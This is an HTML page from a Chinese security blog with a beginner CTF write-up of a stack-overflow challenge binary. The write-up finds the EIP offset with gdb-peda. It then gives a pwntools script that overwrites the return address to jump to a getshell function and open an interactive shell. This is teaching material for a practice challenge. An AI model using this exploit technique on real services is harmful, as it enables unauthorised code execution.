@@ -1,0 +1,1116 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PWN,CTF,栈溢出," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Hvnt3r's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="简单的栈溢出_hello_elf最近哥们问了我一道PWN题，觉得比较有代表性而且难度较低，就记录下来以作栈溢出的示例，仅从新手角度分析，大牛绕过 题目地址：https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg 0x00 基本知识首先，要进行栈溢出的漏洞利用要理解栈的基础结构以及在计算机内的存储方式，之前就有很多大佬写过相关的文章，我也没必要造轮子，就把链接">
+<meta name="keywords" content="PWN,CTF,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="简单的栈溢出_hello_elf">
+<meta property="og:url" content="https://hvnt3r.top/2018/09/简单的栈溢出-hello-elf/index.html">
+<meta property="og:site_name" content="Hvnt3r&#39;s Blog">
+<meta property="og:description" content="简单的栈溢出_hello_elf最近哥们问了我一道PWN题，觉得比较有代表性而且难度较低，就记录下来以作栈溢出的示例，仅从新手角度分析，大牛绕过 题目地址：https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg 0x00 基本知识首先，要进行栈溢出的漏洞利用要理解栈的基础结构以及在计算机内的存储方式，之前就有很多大佬写过相关的文章，我也没必要造轮子，就把链接">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2018/09/28/5bad9123b9fb2.png">
+<meta property="og:image" content="https://i.loli.net/2018/09/28/5bad9a4e28b52.png">
+<meta property="og:image" content="https://i.loli.net/2018/09/28/5bad9123b9fb2.png">
+<meta property="og:image" content="https://i.loli.net/2018/09/28/5bade62d7af8c.png">
+<meta property="og:image" content="https://i.loli.net/2018/09/28/5bade68852d0e.png">
+<meta property="og:image" content="https://i.loli.net/2018/09/28/5badf1bbc1064.png">
+<meta property="og:updated_time" content="2018-10-08T06:35:36.906Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="简单的栈溢出_hello_elf">
+<meta name="twitter:description" content="简单的栈溢出_hello_elf最近哥们问了我一道PWN题，觉得比较有代表性而且难度较低，就记录下来以作栈溢出的示例，仅从新手角度分析，大牛绕过 题目地址：https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg 0x00 基本知识首先，要进行栈溢出的漏洞利用要理解栈的基础结构以及在计算机内的存储方式，之前就有很多大佬写过相关的文章，我也没必要造轮子，就把链接">
+<meta name="twitter:image" content="https://i.loli.net/2018/09/28/5bad9123b9fb2.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://hvnt3r.top/2018/09/简单的栈溢出-hello-elf/"/>
+
+
+
+
+
+  <title>简单的栈溢出_hello_elf | Hvnt3r's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+	<a href="https://github.com/Hvnt3r"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
+	</div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta custom-logo">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hvnt3r's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">让我们来猎杀那些陷入黑暗中的人吧-Shauna Vayne</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-主🐷页">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            主🐷页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-关于我😎">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于我😎
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-标签👀">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签👀
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-分类👅">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类👅
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-所有文章📖">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            所有文章📖
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-友情链接👥">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-link"></i> <br />
+            
+            友情链接👥
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://hvnt3r.top/2018/09/简单的栈溢出-hello-elf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Hvnt3r">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hvnt3r's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">简单的栈溢出_hello_elf</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-09-28T09:12:48+08:00">
+                2018-09-28
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/二进制安全/" itemprop="url" rel="index">
+                    <span itemprop="name">二进制安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/09/简单的栈溢出-hello-elf/" class="leancloud_visitors" data-flag-title="简单的栈溢出_hello_elf">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+				 <span>°C</span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  2.4k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  9
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="简单的栈溢出-hello-elf"><a href="#简单的栈溢出-hello-elf" class="headerlink" title="简单的栈溢出_hello_elf"></a>简单的栈溢出_hello_elf</h1><p>最近哥们问了我一道PWN题，觉得比较有代表性而且难度较低，就记录下来以作栈溢出的示例，仅从新手角度分析，大牛绕过</p>
+<p>题目地址：<a href="https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg" target="_blank" rel="noopener">https://pan.baidu.com/s/1Gd6u_-pRWmPsRJdlnnNYKg</a></p>
+<h2 id="0x00-基本知识"><a href="#0x00-基本知识" class="headerlink" title="0x00 基本知识"></a>0x00 基本知识</h2><p>首先，要进行栈溢出的漏洞利用要理解栈的基础结构以及在计算机内的存储方式，之前就有很多大佬写过相关的文章，我也没必要造轮子，就把链接放在这里吧，<a href="https://baike.baidu.com/item/%E6%A0%88%E6%BA%A2%E5%87%BA/8538051?fr=aladdin" target="_blank" rel="noopener">我是链接</a>，这个是百度百科上比较通用的解答，如果觉得不清楚还可以自己查阅其他的文章</p>
+<a id="more"></a>
+<h2 id="0x01-起手第一步"><a href="#0x01-起手第一步" class="headerlink" title="0x01 起手第一步"></a>0x01 起手第一步</h2><p>首先一般我拿到一个二进制文件的时候会先用<code>file</code>命令看一下文件的类型：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">☁  1  file hello</span><br><span class="line">hello: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=547379e1b7bd695a7546d2a3321e199c0474dfa9, not stripped</span><br></pre></td></tr></table></figure>
+<p>这里显示这是一个32位的ELF文件，其实对于新手来说IDA_Pro的一键f5还是挺方便的，我们先把文件放到IDA里看一下：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" alt=""></p>
+<p>IDA的左侧显示了一些函数的信息，双击函数后再按<code>F5</code>键使IDA显示出伪C代码，这里说是伪C代码是因为这些代码严格意义上不算是C代码，只是IDA为了使程序显示更接近我们的逻辑顺序而显示的一种接近于C语言格式的代码，如果可以通过自己的判断来修复一些伪C代码中的逻辑或者变量名称，可以使得代码接近于源代码，但是我们这道题不涉及修复的知识。</p>
+<p>随便翻看一下这些函数的内容，并在脑海中大致建立一个程序的逻辑框架，看到一个read函数，不知道此函数的作用怎么办，很简单，Linux下自带命令<code>man</code>可与查看函数的手册</p>
+<p>在Linux终端下输入命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">man <span class="built_in">read</span></span><br></pre></td></tr></table></figure>
+<p>此时终端会打印出关于read函数的信息：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9a4e28b52.png" alt=""></p>
+<p>内容很多，感兴趣的同学可以自己敲一下试试，而我们目前只需关注一下信息：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">NAME</span><br><span class="line">       read - read from a file descriptor</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">ssize_t</span> read(<span class="keyword">int</span> fd, <span class="keyword">void</span> *buf, <span class="keyword">size_t</span> count);</span><br></pre></td></tr></table></figure>
+<p>我们需要看一下此函数的相关参数，<code>fd</code>我在<a href="https://hvnt3r.top/2018/09/fd-WriteUp-pwnable-kr%E2%80%94%E2%80%94-fd-Linux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/">之前的文章中</a>介绍过了，这个是文件描述符，不同的值代表不同的文件读写状态，0代表标准输入，后面的<code>*buf</code>代表输入的内容的指针，再后面的<code>count</code>是输入的字节数，此时看之前IDA中的伪代码就可以知道此程序会从用户的标准输入中读取64个unsigned整型并将此内容print出来，但是为什么这道题有漏洞呢，因为他读取的是64字节的内容，但是再IDA中显示内容得知程序只为V1开辟了0x16的空间，如图：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bad9123b9fb2.png" alt=""> </p>
+<p>这显然是会造成栈溢出的，0x16转换为十进制为22，我们可以来验证一下，我个人比较喜欢用<code>gdb</code>来调试ELF文件，其中<code>gdb</code>中有一个十分好用的插件<code>peda</code>，具体的安装方式网上也有很多的教程，在这里我也不浪费时间了，话不多说，<code>gdb</code>启动：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">☁  1  gdb hello </span><br><span class="line">GNU gdb (Debian 8.1-4) 8.1</span><br><span class="line">......</span><br><span class="line">此处省略N个字</span><br><span class="line">......</span><br><span class="line">Reading symbols from hello...(no debugging symbols found)...<span class="keyword">done</span>.</span><br><span class="line">gdb-peda$ checksec </span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : disabled</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : Partial</span><br></pre></td></tr></table></figure>
+<p>先使用<code>checksec</code>来检车一下程序开启的保护措施，可以看到只开启了一个NX，这些保护措施如果不了解没关系，但是第一步<code>checksec</code>是个好习惯。</p>
+<p>我们可以使用<code>r</code>或者<code>run</code>使程序在<code>gdb</code>中运行</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/0101/1/hello </span><br><span class="line">input_test</span><br><span class="line">Hello, input_test</span><br><span class="line"></span><br><span class="line">[Inferior 1 (process 4082) exited normally]</span><br><span class="line">Warning: not running or target is remote</span><br></pre></td></tr></table></figure>
+<p>可以看到程序正常的执行了</p>
+<p>以上我们对此程序的基础信息算是有所掌握了，接下来进行进一步的探索</p>
+<h2 id="0x02-在溢出的边缘疯狂试探"><a href="#0x02-在溢出的边缘疯狂试探" class="headerlink" title="0x02 在溢出的边缘疯狂试探"></a>0x02 在溢出的边缘疯狂试探</h2><p>首先我们已经知道了这个使考察栈溢出的知识了，常见的栈溢出就是程序对用户的输入长度没有进行严格的限制，会导致用户输入的超过程序限制的长度的数据溢出到非预期的位置，从而造成程序逻辑的混乱或者造成软件被破解、<code>getshell</code>等严重的后果，因此我们需要确定一个简单的攻击路线：</p>
+<ul>
+<li style="list-style: none"><input type="checkbox" checked> 确定程序存在的漏洞</li>
+<li style="list-style: none"><input type="checkbox"> 确定溢出点</li>
+<li style="list-style: none"><input type="checkbox"> 寻找溢出利用位置</li>
+<li style="list-style: none"><input type="checkbox"> 成功Getshell</li>
+</ul>
+<p>因此我们需要确认一下溢出点的位置，简单来说就是确定当我们输入多少长度的数据的时候程序会产生溢出，<code>gdb</code>有一个很好的命令可以帮助我们很快的找到溢出点的位置，这个命令就是<code>pattern_creat</code>，使用此命令＋想要生成的字符串的长度就可以生成一串特殊的字符串，如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_creat 50</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'</span></span><br></pre></td></tr></table></figure>
+<p>这串字符串每相邻的三位字母都是不同的，因此如果你在其中找到了三个字母如<code>FAA</code>，而这三个字母可以在这个字符串中确定一个唯一的位置。</p>
+<p>我们试一下把这串字符串输入目标程序<code>hello</code>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ r</span><br><span class="line">Starting program: /root/0101/1/hello </span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbA</span><br></pre></td></tr></table></figure>
+<p>敲击回车，此时会发现终端界面发生变化：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x3b (<span class="string">';'</span>)</span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0xf7fa7890 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fa6000 --&gt; 0x1d5d8c </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x2d414143 (<span class="string">'CAA-'</span>)</span><br><span class="line">ESP: 0xffffd2c0 (<span class="string">"ADAA;AA)AAEAAaAA0AAFAAbA\n"</span>)</span><br><span class="line">EIP: 0x41284141 (<span class="string">'AA(A'</span>)</span><br><span class="line">EFLAGS: 0x10286 (carry PARITY adjust zero SIGN <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41284141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd2c0 (<span class="string">"ADAA;AA)AAEAAaAA0AAFAAbA\n"</span>)</span><br><span class="line">0004| 0xffffd2c4 (<span class="string">";AA)AAEAAaAA0AAFAAbA\n"</span>)</span><br><span class="line">0008| 0xffffd2c8 (<span class="string">"AAEAAaAA0AAFAAbA\n"</span>)</span><br><span class="line">0012| 0xffffd2cc (<span class="string">"AaAA0AAFAAbA\n"</span>)</span><br><span class="line">0016| 0xffffd2d0 (<span class="string">"0AAFAAbA\n"</span>)</span><br><span class="line">0020| 0xffffd2d4 (<span class="string">"AAbA\n"</span>)</span><br><span class="line">0024| 0xffffd2d8 --&gt; 0xa (<span class="string">'\n'</span>)</span><br><span class="line">0028| 0xffffd2dc --&gt; 0xf7de99a1 (&lt;__libc_start_main+241&gt;:	add    esp,0x10)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41284141 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure>
+<p>说明此时程序已经崩溃，报错内容显示EIP中的地址是无效的，终端中显示的三栏依次显示的是程序崩溃时寄存器、错误代码、栈的相关信息，有关每个寄存器的作用在网上也有很多的介绍，我们要关注的是<code>EIP</code>寄存器，这个寄存器存储的是计算机要执行的下一个指令的位置，此时我们发现<code>EIP</code>中显示的是我们刚才输入的字符串中的一部分<code>AA(A</code>，我们先看一下这四个字符在字符串的位置，使用<code>pattern_offset</code>命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern_offset AA(A</span><br><span class="line">AA(A found at offset: 22</span><br></pre></td></tr></table></figure>
+<p>因此我们找到了这个字符串的偏移量为22，换个说法就是说我们输入的字符串在第22位会发生溢出，至此溢出点已被找到</p>
+<ul>
+<li style="list-style: none"><input type="checkbox" checked> 确定溢出点</li>
+</ul>
+<p>就是说我们输入的前22个字符会正常的被程序处理，但是多出来的四个字节会覆盖在<code>EIP</code>寄存器中，如果我们把<code>EIP</code>中的内容修改为我们想执行的命令的位置，则可以执行此命令，如果我们想进一步掌控该程序需要寻找我们想执行的指令的位置。</p>
+<h2 id="0x03-寻找目标指令"><a href="#0x03-寻找目标指令" class="headerlink" title="0x03 寻找目标指令"></a>0x03 寻找目标指令</h2><p>其实找到了溢出点之后利用时有很多种方式，但是这个题目只需要我们在程序本身中寻找利用点，我们回到IDA中查看是否有可以利用的指令，然后发现了一个<code>getshell</code>函数：</p>
+<p><img src="https://i.loli.net/2018/09/28/5bade62d7af8c.png" alt=""></p>
+<p>此函数的地址可以在下图中找到</p>
+<p><img src="https://i.loli.net/2018/09/28/5bade68852d0e.png" alt=""></p>
+<p>函数的地址为：<code>0804846B</code>如果我们把此<code>getshell</code>函数的入口地址放入<code>EIP</code>那么系统在执行<code>EIP</code>寄存器中的命令的时候就会直接运行<code>system(&quot;/bin/sh&quot;);</code>从而得到一个shell。</p>
+<p>为了更贴近CTF中的情景，我们可以使用<code>socat</code>把此程序的标准<code>io</code>绑定到一个端口上从而实现远程通信：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat tcp-listen:10001,reuseaddr,fork EXEC:./hello,pty,raw</span><br></pre></td></tr></table></figure>
+<p><del>端口号可以任意指定但是一定要是空闲端口号（废话）</del></p>
+<p>然后就可以用<code>nc</code>来进行远程通信了如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc x.x.x.x port</span><br></pre></td></tr></table></figure>
+<p>python中有一个大名鼎鼎的库叫做<code>pwntools</code>，我们用这个工具来与远程程序进行交互与破解，此库的安装教程网上也有而且不难，这里就不多说了，漏洞利用脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#连接目标主机，参数为IP和端口</span></span><br><span class="line">stream=remote(<span class="string">'x.x.x.x'</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload即攻击载荷</span></span><br><span class="line">payload=<span class="string">""</span></span><br><span class="line"><span class="comment">#发送22个A并加上getshell函数的地址</span></span><br><span class="line">payload+=<span class="string">"A"</span>*<span class="number">22</span>+p32(<span class="number">0x0804846B</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送payload</span></span><br><span class="line">stream.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#打开一个shell的交互进程</span></span><br><span class="line">stream.interactive()</span><br></pre></td></tr></table></figure>
+<p>代码中p32()函数的作用是将函数地址转换为四个字节的字符串，如果不使用此函数直接发送22个A和0x0804846B则会直接发送16进制的字符而不是真正的地址的格式，运行此程序会发现程序由原来返回用户输入的名字变为了一个由交互功能的shell，可以执行用户输入的指令，到这里漏洞利用就算是成功了，当然，这个shell并不是标准的shell，可以利用python打开一个shell的完全体。</p>
+<p><img src="https://i.loli.net/2018/09/28/5badf1bbc1064.png" alt=""></p>
+<ul>
+<li style="list-style: none"><input type="checkbox" checked> 漏洞利用成功</li>
+</ul>
+<p>我在<code>hello</code>旁边放了一个<code>flag</code>，通过<code>cat flag</code>可以读取<code>flag</code>的内容，至此PWN结束。</p>
+<p>本文章主要面对小白，省去了很多细节以方便理解，如有错误欢迎指正！</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持是我最大的动力︿(￣︶￣)︿</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>Donate</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechat.jpg" alt="Hvnt3r WeChat Pay"/>
+        <p>WeChat Pay</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Hvnt3r Alipay"/>
+        <p>Alipay</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    Hvnt3r
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://hvnt3r.top/2018/09/简单的栈溢出-hello-elf/" title="简单的栈溢出_hello_elf">https://hvnt3r.top/2018/09/简单的栈溢出-hello-elf/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PWN/" rel="tag"><i class="fa fa-tag"></i> PWN</a>
+          
+            <a href="/tags/CTF/" rel="tag"><i class="fa fa-tag"></i> CTF</a>
+          
+            <a href="/tags/栈溢出/" rel="tag"><i class="fa fa-tag"></i> 栈溢出</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/信息安全学习路径/" rel="next" title="信息安全学习路径">
+                <i class="fa fa-chevron-left"></i> 信息安全学习路径
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/09/2017中国高级持续性威胁（APT）研究报告读后感/" rel="prev" title="2017中国高级持续性威胁（APT）研究报告读后感">
+                2017中国高级持续性威胁（APT）研究报告读后感 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
